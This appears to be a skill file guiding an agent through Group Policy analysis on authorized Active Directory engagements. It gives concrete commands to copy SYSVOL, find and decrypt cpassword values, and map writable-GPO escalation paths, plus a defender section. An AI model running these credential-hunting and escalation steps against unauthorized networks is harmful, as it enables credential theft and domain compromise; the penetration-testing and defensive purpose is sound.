---
name: gpo-analysis
description: Use when analyzing Group Policy Objects for misconfigurations
  and credential exposure on an authorized AD engagement. Covers GPO
  enumeration, SYSVOL share review, finding cpasswords and scripts, and
  mapping policy-based attack paths. Use when you have domain credentials,
  when hunting for stored credentials in policies, or when assessing
  privilege escalation through GPO modification rights.
version: 1.0.0
domain: ad
lifecycle: stable
last_verified: 2026-10-23
parent: ad-enumeration
requires: [ad-enumeration]
extends: []
relates: [ldap-enumeration, bloodhound-methodology]
tools:
  - name: Impacket
    version: 0.11.0
  - name: PowerShell
    version: 7.4
  - name: Python
    version: 3.12
---

Group Policy Objects configure every domain machine, and their files in
SYSVOL are readable by all domain users. Old GPOs still carry encrypted
(crackable) passwords, and loose GPO permissions let attackers push
malicious policy. This skill covers GPO analysis on authorized
engagements: enumerating policies, mining SYSVOL, and checking who can
modify what.

## Quick Workflow

1. Enumerate all GPOs and their links to OUs.
2. Mount or list SYSVOL and walk the Policies directories.
3. Search for cpasswords, scripts, and credential material.
4. Review GPO permissions: who can edit each policy.
5. Map the attack path: writable GPO linked to an OU with valuable
   targets.
6. Report credentials found and modification paths separately.

## 1. GPO enumeration

```powershell
# From a domain-joined host with domain credentials
Get-GPO -All | Select-Object DisplayName, Id, GpoStatus | head -20

# Which OUs link which GPOs
Get-GPO -All | ForEach-Object {
  [xml]$r = Get-GPOReport -Guid $_.Id -ReportType Xml
  $r.GPO.LinksTo | Select-Object SOMName, SOMPath
} | head -20

# Who can modify each GPO (the escalation path)
Get-GPPermissions -Guid <GPO-ID> -All | Select-Object Trustee, Permission
```

A GPO editable by a non-admin group and linked to the Domain Controllers
OU is a domain-compromise path. Rank GPOs by link target value times
editability.

## 2. SYSVOL mining

```bash
# List the SYSVOL policies share
smbclient //10.0.5.10/SYSVOL -U 'corp.example\testuser%TestPass123!' \
  -c 'recurse; ls Policies/' 2>/dev/null | head -30

# Download the whole Policies tree for offline grep (it is small)
smbget -R -U 'corp.example\testuser%TestPass123!' \
  smb://10.0.5.10/SYSVOL/corp.example/Policies/ /tmp/sysvol/

# Hunt for cpasswords (old Group Policy Preferences passwords, AES-256
# encrypted with a PUBLIC key: decryptable with gpp-decrypt)
grep -ri 'cpassword' /tmp/sysvol/ 2>/dev/null | head -10

# Scripts and credential material in policy files
grep -ri -E 'password|passwd|pwd' /tmp/sysvol/ --include='*.xml' \
  2>/dev/null | grep -v -i 'policy' | head -20
find /tmp/sysvol -name '*.bat' -o -name '*.ps1' -o -name '*.vbs' | head -20
```

cpasswords decrypt with the publicly known AES key, which makes them
plaintext passwords in practice. Decrypt each one, verify by binding as
the account, and handle under credential rules.

```bash
# Decrypt a found cpassword (the key is public knowledge)
gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'
```

## 3. Modification rights review

```bash
# Check GPO DACLs for non-admin edit rights via ldapsearch
ldapsearch -x -H ldap://10.0.5.10 -D "testuser@corp.example" -w 'TestPass123!' \
  -b "CN=Policies,CN=System,dc=corp,dc=example" \
  "(objectClass=groupPolicyContainer)" displayName 2>/dev/null | head -20
# Then inspect nTSecurityDescriptor for WriteProperty/WriteDacl grants
# to groups your user belongs to
```

If your user can edit a GPO linked to workstations, you can push a
malicious script or scheduled task to those machines. Prove the right
exists; only push actual policy changes with explicit approval, since
GPO edits affect production machines.

## Edge cases

- SYSVOL is huge on old domains. Target the Policies tree only; the
  scripts and staging folders are secondary.
- cpasswords were cleaned long ago. Still check: migrations miss GPOs,
  and one leftover password is enough.
- GPO permissions look fine from your view. Re-check after any
  privilege change; new group memberships open new GPO paths.
- Replication lag hides your test changes. Wait for SYSVOL replication
  or target the PDC emulator directly when verifying.

## Escalation

- A writable GPO is confirmed: document the edit right, the linked OU,
  and the resulting attack path; execute the push only with written
  approval and a rollback plan.
- Credentials found in SYSVOL: verify, report through the sensitive
  channel, and recommend immediate rotation.
- GPO analysis is clean: note it as positive assurance in the report.

## Detection and defender view

Defenders see GPO attacks as policy modifications (event logs on the
DC), new scripts appearing in SYSVOL (FIM), and machines suddenly
running unexpected startup scripts. cpassword discovery is invisible
(read-only SYSVOL access). Defenses are removing all cpasswords,
tightening GPO edit permissions to Domain Admins, monitoring GPO
version changes, and FIM on SYSVOL.

## Key references

- MITRE ATT&CK T1484.001 (Domain Policy Modification: Group Policy
  Modification).
- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor).
- Microsoft documentation on Group Policy Preferences (cpassword history).
